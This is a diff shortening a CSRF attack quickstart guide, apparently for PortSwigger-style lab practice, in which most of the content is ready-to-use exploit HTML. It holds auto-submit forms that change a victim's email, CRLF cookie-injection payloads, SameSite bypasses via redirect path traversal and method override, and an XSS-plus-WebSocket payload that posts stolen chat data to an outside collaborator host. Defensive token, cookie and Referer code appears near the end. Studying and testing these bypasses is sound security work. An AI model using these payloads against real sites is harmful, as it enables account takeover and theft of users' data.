@@ -1,417 +1,177 @@
-# CSRF Attack Quick Start Guide
+# CSRF Quickstart
 
-## What is CSRF?
+CSRF forces an authenticated victim's browser to perform unwanted state-changing actions on a target site using their existing session.
 
-**Cross-Site Request Forgery (CSRF)** forces an authenticated user's browser to perform unwanted actions on a web application. The attacker tricks the victim into submitting a malicious request using their existing session.
+## Quick identification
 
-**Impact**: Account takeover, unauthorized transactions, data modification, administrative abuse
+1. **Token present?** Look for `csrf` (or similar) param in POST body. Absent → vulnerable.
+2. **Token validated?** Change to invalid value → still works → vulnerable.
+3. **Token required?** Remove entirely → still works → vulnerable.
+4. **Token session-bound?** Use another user's token → works → vulnerable.
+5. **Method check?** `GET /change-email?email=...` works → method-bypass vulnerable.
+6. **Referer check?** Remove Referer → works → vulnerable. Set `Referer: https://evil.com?legitimate-domain.com` → works → substring-match vulnerable.
 
-## Quick Identification
-
-### 1. Check for CSRF Tokens
-```http
-POST /change-email HTTP/1.1
-Cookie: session=abc123
-
-email=new@email.com
-```
-**Vulnerable**: No `csrf` parameter present
-
-### 2. Test Token Validation
-- Change token to invalid value → Still works? **Vulnerable**
-- Remove token entirely → Still works? **Vulnerable**
-- Use another user's token → Still works? **Vulnerable**
-
-### 3. Check HTTP Methods
-```bash
-# Try converting POST to GET
-GET /change-email?email=new@email.com
-```
-Works? **Vulnerable to method-based bypass**
-
-### 4. Check Referer Validation
-- Remove Referer header → Works? **Vulnerable**
-- Change Referer to `https://evil.com?legitimate-domain.com` → Works? **Vulnerable (substring match)**
-
-## Basic CSRF Exploit Template
+## Basic exploit template
 
 ```html
-<html>
-  <body>
-    <form method="POST" action="https://target.com/change-email">
-      <input type="hidden" name="email" value="attacker@evil.com">
-      <input type="hidden" name="csrf" value="TOKEN-IF-NEEDED">
-    </form>
-    <script>
-      document.forms[0].submit();
-    </script>
-  </body>
-</html>
+<form method="POST" action="https://target.com/change-email">
+  <input type="hidden" name="email" value="attacker@evil.com">
+  <input type="hidden" name="csrf" value="TOKEN-IF-NEEDED">
+</form>
+<script>document.forms[0].submit();</script>
 ```
 
-## Common Bypass Techniques
+## Bypass catalog
 
-### 1. Method-Based Bypass
-**Vulnerability**: Only POST validates CSRF token
-
+### 1. Method bypass (only POST validates token)
 ```html
-<!-- Use GET instead -->
 <form action="https://target.com/change-email">
   <input type="hidden" name="email" value="attacker@evil.com">
 </form>
 <script>document.forms[0].submit();</script>
 ```
 
-### 2. Token Not Tied to Session
-**Vulnerability**: Any valid token works for any user
+### 2. Token not session-bound
+Use attacker's own valid token in the form. Any valid token accepted.
 
-1. Get your own CSRF token
-2. Use it to attack other users
-
-```html
-<form method="POST" action="https://target.com/change-email">
-  <input type="hidden" name="email" value="attacker@evil.com">
-  <input type="hidden" name="csrf" value="YOUR-TOKEN">
-</form>
-<script>document.forms[0].submit();</script>
-```
-
-### 3. Token in Cookie
-**Vulnerability**: Token validates against separate `csrfKey` cookie + CRLF injection exists
-
+### 3. Token in cookie + CRLF injection
+Token validates against `csrfKey` cookie; CRLF lets attacker inject the matching cookie:
 ```html
 <form method="POST" action="https://target.com/change-email">
   <input type="hidden" name="email" value="attacker@evil.com">
   <input type="hidden" name="csrf" value="fake">
 </form>
-<!-- Inject matching cookie -->
-<img src="https://target.com/?search=test%0d%0aSet-Cookie:%20csrfKey=fake%3b%20SameSite=None" onerror="document.forms[0].submit();">
+<img src="https://target.com/?search=test%0d%0aSet-Cookie:%20csrfKey=fake%3b%20SameSite=None"
+     onerror="document.forms[0].submit();">
 ```
 
-### 4. Double Submit Cookie
-**Vulnerability**: Token just compared: `cookie == parameter`
-
+### 4. Double-submit cookie (cookie == param)
 ```html
-<form method="POST" action="https://target.com/change-email">
-  <input type="hidden" name="email" value="attacker@evil.com">
-  <input type="hidden" name="csrf" value="fake">
-</form>
-<img src="https://target.com/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();">
+<img src="https://target.com/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"
+     onerror="document.forms[0].submit();">
 ```
 
-### 5. Token Validation When Present
-**Vulnerability**: Validation only if token exists
+### 5. Token validated only if present
+Omit the `csrf` parameter entirely.
 
+### 6. Referer validated only if present
+Suppress Referer:
 ```html
-<!-- Just omit the token! -->
-<form method="POST" action="https://target.com/change-email">
-  <input type="hidden" name="email" value="attacker@evil.com">
-  <!-- No csrf parameter at all -->
-</form>
-<script>document.forms[0].submit();</script>
+<meta name="referrer" content="no-referrer">
 ```
 
-### 6. Referer Validation When Present
-**Vulnerability**: Validation only if Referer exists
-
+### 7. Substring Referer match
+Set Referer URL to include target domain as substring:
 ```html
-<html>
-  <head>
-    <meta name="referrer" content="no-referrer">
-  </head>
-  <body>
-    <form method="POST" action="https://target.com/change-email">
-      <input type="hidden" name="email" value="attacker@evil.com">
-    </form>
-    <script>document.forms[0].submit();</script>
-  </body>
-</html>
+<meta name="referrer" content="unsafe-url">
+<script>
+  history.pushState("", "", "/?target.com");
+  document.forms[0].submit();
+</script>
 ```
 
-### 7. Broken Referer Validation
-**Vulnerability**: Substring match on Referer
-
-```html
-<html>
-  <head>
-    <meta name="referrer" content="unsafe-url">
-  </head>
-  <body>
-    <form method="POST" action="https://target.com/change-email">
-      <input type="hidden" name="email" value="attacker@evil.com">
-    </form>
-    <script>
-      history.pushState("", "", "/?target.com");
-      document.forms[0].submit();
-    </script>
-  </body>
-</html>
-```
-
-### 8. SameSite Strict via Redirect
-**Vulnerability**: Client-side redirect with path traversal + SameSite=Strict + no tokens
-
+### 8. SameSite Strict via redirect path traversal
 ```html
 <script>
   document.location = "https://target.com/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40attacker.com%26submit=1";
 </script>
 ```
 
-### 9. SameSite Strict via Sibling Domain
-**Vulnerability**: XSS on sibling subdomain + WebSocket without CSRF protection
-
+### 9. SameSite Strict via sibling-domain XSS + WebSocket
+XSS on `cms-target.com` → WebSocket on `target.com/chat` (same registrable domain, no SameSite enforcement on WebSocket):
 ```html
 <script>
 var payload = `<script>
 var ws = new WebSocket('wss://target.com/chat');
-ws.onopen = function() { ws.send('READY'); };
-ws.onmessage = function(event) {
-    fetch('https://collaborator.com', {
-        method: 'POST',
-        mode: 'no-cors',
-        body: event.data
-    });
-};
+ws.onopen = () => ws.send('READY');
+ws.onmessage = e => fetch('https://collaborator.com',{method:'POST',mode:'no-cors',body:e.data});
 <\/script>`;
-
-document.location = "https://cms-target.com/login?username=" + encodeURIComponent(payload) + "&password=x";
+document.location = "https://cms-target.com/login?username="+encodeURIComponent(payload)+"&password=x";
 </script>
 ```
 
-### 10. SameSite Lax via Method Override
-**Vulnerability**: `_method` parameter + SameSite=Lax
-
+### 10. SameSite Lax + `_method` override
 ```html
-<script>
-  document.location = "https://target.com/change-email?email=pwned@attacker.com&_method=POST";
-</script>
+<script>document.location = "https://target.com/change-email?email=pwned@attacker.com&_method=POST";</script>
 ```
 
-## Burp Suite Workflow
+## Detection checklist
 
-### Step 1: Intercept Request
-1. **Proxy > Intercept**: Turn on
-2. Submit form in browser
-3. Capture POST request
+| Test | Action | Vulnerable when |
+|------|--------|-----------------|
+| Token present | inspect POST body | no `csrf` param |
+| Token validated | `csrf=invalid` | request succeeds |
+| Token required | remove param | request succeeds |
+| Session-bound | use another user's token | request succeeds |
+| Method check | POST→GET | request succeeds |
+| Referer check | remove Referer | request succeeds |
+| Referer substring | `evil.com?target.com` | request succeeds |
+| SameSite set | response `Set-Cookie` | no `SameSite=` |
+| Method override | `?_method=POST` in GET | request succeeds |
 
-### Step 2: Test in Repeater
-1. Right-click request → "Send to Repeater"
-2. Test variations:
-   - Invalid token
-   - Missing token
-   - Different HTTP method (right-click → "Change request method")
-   - Modified/removed Referer header
+## Burp workflow
 
-### Step 3: Generate PoC
-**Burp Professional:**
-1. Right-click request → "Engagement tools" → "Generate CSRF PoC"
-2. Click "Options" → Enable "Include auto-submit script"
-3. Click "Regenerate"
-4. Copy HTML
+1. Proxy → intercept ON → submit form → capture POST.
+2. Send to Repeater (Ctrl+R). Test variations: invalid token / missing token / GET / no Referer.
+3. Generate PoC: right-click → Engagement Tools → Generate CSRF PoC → enable auto-submit. (Burp Pro)
+4. Test on Burp exploit server: paste HTML in Body → Store → View exploit → Deliver to victim.
 
-**Burp Community:**
-- Manually create HTML form (see templates above)
-
-### Step 4: Test with Exploit Server
-1. Paste HTML into "Body" field
-2. Click "Store"
-3. Click "View exploit" to test
-4. Click "Deliver exploit to victim"
-
-## Detection Checklist
-
-| Test | Command/Action | Vulnerable If |
-|------|---------------|---------------|
-| **Token present?** | Check POST body | No `csrf` parameter |
-| **Token validated?** | Change to `csrf=invalid` | Request succeeds |
-| **Token required?** | Remove `csrf` parameter | Request succeeds |
-| **Session-bound?** | Use different user's token | Request succeeds |
-| **Method validated?** | Change POST to GET | Request succeeds |
-| **Referer checked?** | Remove Referer header | Request succeeds |
-| **Referer parsed?** | Set to `evil.com?target.com` | Request succeeds |
-| **SameSite set?** | Check Set-Cookie header | No SameSite attribute |
-| **Method override?** | Try `?_method=POST` in GET | Request succeeds |
-
-## Common CRLF Injection Payloads
+## CRLF cookie injection payloads
 
 ```
-# Basic injection
 ?search=test%0d%0aSet-Cookie:%20csrf=fake
-
-# With SameSite bypass
 ?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
-
-# URL encoding reference
-%0d = \r (carriage return)
-%0a = \n (line feed)
-%20 = space
-%3b = semicolon (;)
 ```
 
-## Defense Quick Reference
+URL encoding: `%0d` CR, `%0a` LF, `%20` space, `%3b` `;`, `%3c` `<`, `%3e` `>`, `%26` `&`, `%27` `'`, `%22` `"`.
 
-### Secure CSRF Token Implementation
+## Defense
+
 ```python
-# Generate
-token = secrets.token_urlsafe(32)
-session['csrf_token'] = token
+# Token generation + validation
+import secrets
+session['csrf_token'] = secrets.token_urlsafe(32)
 
-# Validate
-def validate_csrf(request, session):
-    token = request.form.get('csrf')
-    if not token:
-        return False
-    if token != session.get('csrf_token'):
-        return False
-    return True
+def validate_csrf(req, sess):
+    return req.form.get('csrf') == sess.get('csrf_token')
 ```
 
-### Secure Cookie Configuration
 ```
-Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict; Path=/
+Set-Cookie: session=...; Secure; HttpOnly; SameSite=Strict; Path=/
 ```
 
-### Secure Referer Validation
 ```python
 from urllib.parse import urlparse
-
 referer = request.headers.get('Referer')
-if not referer:
-    return False
-
-parsed = urlparse(referer)
-if parsed.hostname != expected_domain:
-    return False
+if not referer: return False
+if urlparse(referer).hostname != expected_domain: return False
 ```
 
-## Quick Command Reference
+## Testing script
 
-### Burp Suite
-```
-# Keyboard shortcuts
-Ctrl+R     = Send to Repeater
-Ctrl+I     = Send to Intruder
-Ctrl+Shift+B = Base64 encode
-Ctrl+Shift+U = URL encode
-
-# Repeater actions
-Right-click → "Change request method"
-Right-click → "Change body encoding"
-```
-
-### Testing Script
 ```python
 import requests
 
-# Test CSRF vulnerability
 def test_csrf(url, cookie):
-    # Without token
-    r = requests.post(url,
-        data={'email': 'test@test.com'},
-        cookies={'session': cookie})
+    r = requests.post(url, data={'email':'test@test.com'}, cookies={'session':cookie})
     return r.status_code == 200
 
-# Test with different methods
 def test_methods(url, cookie):
-    methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']
-    for method in methods:
-        r = requests.request(method, url,
-            data={'email': 'test@test.com'},
-            cookies={'session': cookie})
-        if r.status_code == 200:
-            print(f"[!] {method} works without CSRF token")
+    for m in ['GET','POST','PUT','DELETE','PATCH']:
+        r = requests.request(m, url, data={'email':'test@test.com'}, cookies={'session':cookie})
+        if r.status_code == 200: print(f"[!] {m} works without CSRF token")
 ```
-
-## URL Encoding Reference
-
-| Character | Encoded | Usage |
-|-----------|---------|-------|
-| Space | `%20` | Cookie injection |
-| `!` | `%21` | - |
-| `"` | `%22` | Attribute escaping |
-| `#` | `%23` | Fragment |
-| `&` | `%26` | Keep as one parameter |
-| `'` | `%27` | Attribute escaping |
-| `;` | `%3b` | Cookie separator |
-| `<` | `%3c` | XSS payload |
-| `>` | `%3e` | XSS payload |
-| `?` | `%3f` | Query string |
-| `@` | `%40` | Email addresses |
-| CR | `%0d` | CRLF injection |
-| LF | `%0a` | CRLF injection |
-
-## Bypass Techniques Quick Reference
-
-| Bypass Type | Technique | Key Payload |
-|-------------|-----------|-------------|
-| No CSRF protection | Basic form auto-submit | Standard POST form |
-| Token only on POST | Change method to GET | GET request |
-| Token not session-bound | Use attacker's own valid token | Any valid token |
-| Token tied to separate cookie | CRLF cookie injection | `%0d%0aSet-Cookie:%20csrfKey=fake` |
-| Double-submit cookie | CRLF inject matching csrf cookie | `%0d%0aSet-Cookie:%20csrf=fake` |
-| Token only validated if present | Omit token entirely | No csrf param |
-| Referer only validated if present | Suppress Referer | `<meta name="referrer" content="no-referrer">` |
-| Referer substring match | Append target domain to URL | `history.pushState("","","/?target.com")` |
-| SameSite=Strict, client-side redirect | Path traversal via redirect | `/../sensitive-action?param=value` |
-| SameSite=Strict, sibling domain XSS | XSS on subdomain | XSS + WebSocket/fetch across subdomains |
-| SameSite=Lax, method override | `_method` parameter | `?_method=POST` in GET request |
 
 ## Troubleshooting
 
-### Exploit doesn't work
-- [ ] Check session cookie is valid
-- [ ] Use unique email address (not duplicate)
-- [ ] Check JavaScript console for errors
-- [ ] Ensure proper URL encoding
-- [ ] Test with "View exploit" first
-
-### Token issues
-- [ ] Get fresh token (many are single-use)
-- [ ] Check if token tied to session (use your own token)
-- [ ] Verify token parameter name matches exactly
-- [ ] Confirm token not expired
-
-### Cookie injection fails
-- [ ] Verify CRLF encoding: `%0d%0a`
-- [ ] Check semicolon encoding: `%3b`
-- [ ] Add `SameSite=None` for cross-site
-- [ ] Ensure injection point exists (search, etc.)
-
-### SameSite bypass issues
-- [ ] Use Chrome/Chromium browser
-- [ ] For Lax: Use top-level navigation (`document.location`)
-- [ ] For Strict: Use same-site gadget (redirect/XSS)
-- [ ] Check cookie attributes in response headers
+- Use unique email each test (server may reject duplicates as success).
+- Some tokens are single-use — fetch a fresh one before each attempt.
+- Verify CRLF encoding (`%0d%0a`), semicolon (`%3b`), `SameSite=None` for cross-site cookies.
+- For SameSite=Lax test in Chrome top-level nav (`document.location`).
+- For SameSite=Strict need same-site gadget (XSS / open redirect).
 
 ## Resources
 
-- **CSRF Reference**: https://portswigger.net/web-security/csrf
-- **OWASP CSRF Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
-
-## Practice Tips
-
-1. **Start simple**: Understand the basics before moving to bypasses
-2. **Use Repeater**: Test manually before creating exploits
-3. **Read responses**: Error messages reveal validation logic
-4. **Try everything**: Test all methods, headers, parameters
-5. **Document findings**: Note what works and why
-6. **Chain attacks**: Combine with XSS, CRLF injection, etc.
-7. **Understand defenses**: Learn why bypasses work
-8. **Test real apps**: Apply skills to bug bounty programs
-
-## Quick Win Checklist
-
-For a new target, test in this order:
-
-1. ✓ Submit form and capture request
-2. ✓ Check if CSRF token exists
-3. ✓ If token exists, try removing it
-4. ✓ Try changing POST to GET
-5. ✓ Try different user's token
-6. ✓ Test Referer header manipulation
-7. ✓ Check for method override parameters
-8. ✓ Look for cookie injection points
-9. ✓ Check SameSite cookie attributes
-10. ✓ Look for same-site gadgets (redirects, XSS)
-
-Most vulnerabilities will be found in steps 1-6!
+- [PortSwigger CSRF](https://portswigger.net/web-security/csrf)
+- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
+- See `scenarios/xss/csrf-via-xss.md` for chaining CSRF with XSS.
